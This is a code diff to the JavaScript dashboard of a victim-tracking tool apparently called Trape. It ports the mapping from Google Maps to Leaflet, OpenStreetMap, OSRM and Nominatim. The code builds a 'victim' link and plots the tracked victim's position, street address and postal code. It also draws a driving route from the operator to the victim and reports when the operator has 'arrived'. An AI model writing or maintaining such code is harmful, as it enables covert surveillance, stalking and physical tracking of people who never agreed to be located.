@@ -94,6 +94,7 @@ $(document).ready(function() {
                     $('#lnkTrapeControl_url').attr('href', 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
 
                     socket.emit('join', {room: id.id});
+                    initMap();
                }
             },
             error: function(error) {
@@ -674,73 +675,71 @@ var t_map;
 
 var initMap = function() {
     try {
-        window.t_map = new google.maps.Map(document.getElementById('cntTrapeControlPreview_Map'), {
-          zoom: 4,
-          center: {lat: 4.6567033, lng: -74.0593867}
-        });
+        window.t_map = L.map('cntTrapeControlPreview_Map').setView([4.6567033, -74.0593867], 4);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap contributors',
+            maxZoom: 19
+        }).addTo(window.t_map);
     }
     catch(err) {
-        
+
     }
 
     window.markers = [];
   }
 
 var loadMap = function(locations){
-    var bounds = new google.maps.LatLngBounds();
-    var cIcon = 'blue';
+    var bounds = L.latLngBounds();
 
     for (var i = 0; i < window.markers.length; i++) {
-      window.markers[i].setMap(null);
+      window.t_map.removeLayer(window.markers[i]);
+    }
+
+    if (window.routeLine) {
+        window.t_map.removeLayer(window.routeLine);
+        window.routeLine = null;
     }
 
     window.markers = [];
 
     function put_Current_Position_onMap(lat, lon){
-            marker = new google.maps.Marker({
-            position: new google.maps.LatLng(parseFloat(lat), parseFloat(lon)),
-            map: window.t_map,
-            icon: {
-              path: google.maps.SymbolPath.CIRCLE,
-              scale: 5,
-              strokeColor: '#000',
-              strokeWeight: 5, 
-              fillColor: '#fff',
-              fillOpacity:1
-            }
+        var currentIcon = L.divIcon({
+            className: 'leaflet-current-pos',
+            html: '<svg width="14" height="14"><circle cx="7" cy="7" r="5" stroke="#000" stroke-width="2" fill="#fff"/></svg>',
+            iconSize: [14, 14],
+            iconAnchor: [7, 7]
         });
 
-        bounds.extend(marker.position);
+        var marker = L.marker([parseFloat(lat), parseFloat(lon)], {icon: currentIcon, title: 'Current position'}).addTo(window.t_map);
+
+        bounds.extend(marker.getLatLng());
 
         window.markers.push(marker);
 
         var idPos = window.markers.length - 1;
 
         $.each(window.markers, function(index, val) {
-            var p = val.position;
+            var p = val.getLatLng();
 
              if (index != idPos){
-                var d = getRange(p.lat(), p.lng(), lat, lon);
-                val.setTitle(String(d) + ' Kms');
-             } else{
-                val.setTitle('Current position');
+                var d = getRange(p.lat, p.lng, lat, lon);
+                val.bindTooltip(String(d) + ' Kms');
              }
         });
     }
 
-    for (i = 0; i < locations.length; i++) {
-        marker = new google.maps.Marker({
-            position: new google.maps.LatLng(locations[i][1], locations[i][2]),
-            map: window.t_map,
-            icon: {
-              scaledSize: new google.maps.Size(35, 35),
-              url: 'static/img/point-' + cIcon + '.svg'
-            }
+    var cIcon = 'blue';
+    for (var i = 0; i < locations.length; i++) {
+        var pointIcon = L.icon({
+            iconUrl: 'static/img/point-' + cIcon + '.svg',
+            iconSize: [35, 35],
+            iconAnchor: [17, 35]
         });
-        
+        var marker = L.marker([locations[i][1], locations[i][2]], {icon: pointIcon}).addTo(window.t_map);
+
         cIcon = 'red';
 
-        bounds.extend(marker.position);
+        bounds.extend(marker.getLatLng());
 
         window.markers.push(marker);
     }
@@ -756,33 +755,17 @@ var loadMap = function(locations){
 
             f_tracking_victim();
         }, function(objPositionError) {
-           $.ajax({
-                url: "https://www.googleapis.com/geolocation/v1/geolocate?key=" + window.gMapsApiKey,
-                data: {},
-                dataType: "json",
-                type: "POST",
-                success: function(response, status) {
-                    if (status == 'success'){
-                        var lat = locations[1][1];
-                        var lat = locations[1][2];
-                        put_Current_Position_onMap(lat, lon);
-                        geolocation_callback(response.location.lat, response.location.lng);
-                    } else{
-                        alert("Unable to access your position information.");
-                    }
-                },
-                error: function(error) {
-                    alert("Access to the user's position was not allowed.");
-                }
-            });
-            
+            // Fallback: just fit bounds without current position
+            console.log("Geolocation denied. Map will show victim location only.");
         }, {
             maximumAge: 75000,
             timeout: 15000
         });
     }
 
-    window.t_map.fitBounds(bounds);
+    if (bounds.isValid()) {
+        window.t_map.fitBounds(bounds, {padding: [30, 30]});
+    }
 }
 
 var fillTab = function(data_action, data){
@@ -874,39 +857,27 @@ function getRange(lat1,lon1,lat2,lon2) {
 function f_tracking_victim(){
     if (navigator.geolocation){
         navigator.geolocation.getCurrentPosition(function(objPosition){
-            var latlng = new google.maps.LatLng(objPosition.coords.latitude, objPosition.coords.longitude);
-            window.markers[2].setPosition(latlng);
+            var latlng = L.latLng(objPosition.coords.latitude, objPosition.coords.longitude);
+            if (window.markers[2]) {
+                window.markers[2].setLatLng(latlng);
+            }
 
-            var objLocation = window.markers[1].getPosition();
-        
-            var vOrigin = objPosition.coords.latitude + ',' + objPosition.coords.longitude;
-            var vDestination = objLocation.lat() + ',' + objLocation.lng();
+            if (window.markers[1]) {
+                var objLocation = window.markers[1].getLatLng();
+                var distKm = parseFloat(getRange(objPosition.coords.latitude, objPosition.coords.longitude, objLocation.lat, objLocation.lng));
+                var distMeters = distKm * 1000;
 
-            window.directionsService.route({
-                  origin: vOrigin,
-                  destination: vDestination,
-                  travelMode: 'DRIVING'
-                }, function(response, status) {
-                if (status === 'OK') {
-                    var vLegs = response.routes[0].legs[0];
-                    if (vLegs != undefined){
-                        if (vLegs.distance != undefined){
-                            if (vLegs.distance.value != undefined){
-                                $('#txtTrapeControl_Distance').text(vLegs.distance.text);
-                                if (vLegs.distance.value < 15){
-                                    $('#txtTrapeControl_Distance').text('you have arrived');
-                                    $('#txtTrapeControl_Distance').removeClass('TrapeControl-Preview--box---Distance----NowDistance');
-                                    $('#txtTrapeControl_Distance').addClass('TrapeControl-Preview--box---Distance----NowTarget');
-                                } else{
-                                    $('#txtTrapeControl_Distance').removeClass('TrapeControl-Preview--box---Distance----NowTarget');
-                                    $('#txtTrapeControl_Distance').addClass('TrapeControl-Preview--box---Distance----NowDistance');
-                                    
-                                }
-                            }
-                        }
-                    }
-                } 
-            });
+                if (distMeters < 15){
+                    $('#txtTrapeControl_Distance').text('you have arrived');
+                    $('#txtTrapeControl_Distance').removeClass('TrapeControl-Preview--box---Distance----NowDistance');
+                    $('#txtTrapeControl_Distance').addClass('TrapeControl-Preview--box---Distance----NowTarget');
+                } else{
+                    $('#txtTrapeControl_Distance').text(distKm.toFixed(2) + ' km');
+                    $('#txtTrapeControl_Distance').removeClass('TrapeControl-Preview--box---Distance----NowTarget');
+                    $('#txtTrapeControl_Distance').addClass('TrapeControl-Preview--box---Distance----NowDistance');
+                }
+            }
+
             if (window.tracking_victim){
                 setTimeout(f_tracking_victim, 30000);
             }
@@ -914,7 +885,7 @@ function f_tracking_victim(){
             if (window.tracking_victim){
                 setTimeout(f_tracking_victim, 10000);
             }
-            
+
         }, {
             maximumAge: 75000,
             timeout: 15000
@@ -924,37 +895,55 @@ function f_tracking_victim(){
 
 function geolocation_callback(lat, lon){
 
-    if (window.directionsDisplay != undefined){
-        window.directionsDisplay.setMap(null);
+    if (window.routeLine) {
+        window.t_map.removeLayer(window.routeLine);
+        window.routeLine = null;
     }
 
-    window.directionsService = new google.maps.DirectionsService;
-    window.directionsDisplay = new google.maps.DirectionsRenderer;
-
-    window.directionsDisplay.setMap(window.t_map);
-    directionsDisplay.setOptions( { suppressMarkers: true } );
-
-    
     function calculateAndDisplayRoute() {
-        var objLocation = window.markers[1].getPosition();
-        
-        var vOrigin = lat + ',' + lon;
-        var vDestination = objLocation.lat() + ',' + objLocation.lng();
+        if (!window.markers[1]) return;
+        var objLocation = window.markers[1].getLatLng();
 
-        window.directionsService.route({
-          origin: vOrigin,
-          destination: vDestination,
-          travelMode: 'DRIVING'
-        }, function(response, status) {
-          if (status === 'OK') {
-            var vLegs = response.routes[0].legs[0];
-            $('.TrapeControl-Preview--box---Distance----subText').text(vLegs.distance.text);
-            $('.TrapeControl-Preview--box---Distance----subTextTime').text(vLegs.duration.text);
-            $('#lblTrapeContol_Address').text(vLegs.end_address)
-            directionsDisplay.setDirections(response);
-          } else {
-            window.alert('Directions request failed due to ' + status);
-          }
+        var vOriginLon = lon;
+        var vOriginLat = lat;
+        var vDestLon = objLocation.lng;
+        var vDestLat = objLocation.lat;
+
+        // Try OSRM for real route, fallback to straight line
+        $.getJSON('https://router.project-osrm.org/route/v1/driving/' + vOriginLon + ',' + vOriginLat + ';' + vDestLon + ',' + vDestLat + '?overview=full&geometries=geojson', function(data) {
+            if (data.code === 'Ok' && data.routes && data.routes.length > 0) {
+                var route = data.routes[0];
+                var coords = route.geometry.coordinates.map(function(c) { return [c[1], c[0]]; });
+                window.routeLine = L.polyline(coords, {color: '#4285F4', weight: 4, opacity: 0.8}).addTo(window.t_map);
+
+                var distKm = (route.distance / 1000).toFixed(2);
+                var durMin = Math.round(route.duration / 60);
+                var durText = durMin < 60 ? durMin + ' mins' : Math.floor(durMin/60) + ' h ' + (durMin%60) + ' mins';
+
+                $('.TrapeControl-Preview--box---Distance----subText').text(distKm + ' km');
+                $('.TrapeControl-Preview--box---Distance----subTextTime').text(durText);
+            } else {
+                drawStraightLine();
+            }
+        }).fail(function() {
+            drawStraightLine();
+        });
+
+        function drawStraightLine() {
+            window.routeLine = L.polyline([[vOriginLat, vOriginLon], [vDestLat, vDestLon]], {color: '#4285F4', weight: 3, dashArray: '10, 10', opacity: 0.7}).addTo(window.t_map);
+            var distKm = getRange(vOriginLat, vOriginLon, vDestLat, vDestLon);
+            $('.TrapeControl-Preview--box---Distance----subText').text(distKm + ' km (straight line)');
+            $('.TrapeControl-Preview--box---Distance----subTextTime').text('--');
+        }
+
+        // Reverse geocode with Nominatim
+        $.getJSON('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + vDestLat + '&lon=' + vDestLon, function(data) {
+            if (data && data.display_name) {
+                $('#lblTrapeContol_Address').text(data.display_name);
+                if (data.address && data.address.postcode) {
+                    $('#mapPostalCode').text(data.address.postcode);
+                }
+            }
         });
     }
     calculateAndDisplayRoute();
@@ -1384,29 +1373,23 @@ var User = {
   }
 }
  , getAddress : function(lat, lon){
-    $.getJSON('https://maps.googleapis.com/maps/api/geocode/json?latlng=' + lat + ',' + lon + '&key=' + window.gMapsApiKey + '')
+    $.getJSON('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon)
       .done(function( data ) {
           var jAddress = {};
           jAddress.formatted_address = '--';
           jAddress.postal_code = '--';
 
-          if (data.results[0] != undefined){
-              if (data.results[0].formatted_address != undefined){
-                  jAddress.formatted_address = data.results[0].formatted_address;
-              }
-              if (data.results[0].address_components != undefined){
-                  if (data.results[0].address_components[7] != undefined){
-                      if (data.results[0].address_components[7].long_name != undefined){
-                          jAddress.postal_code = data.results[0].address_components[7].long_name;
-                      }
-                  }
-              }
+          if (data && data.display_name) {
+              jAddress.formatted_address = data.display_name;
           }
-          
+          if (data && data.address && data.address.postcode) {
+              jAddress.postal_code = data.address.postcode;
+          }
+
           $('#mapPostalCode').text(jAddress.postal_code);
 
           fillTab('address', jAddress);
       });
-  } 
+  }
 }
 //# sourceMappingURL
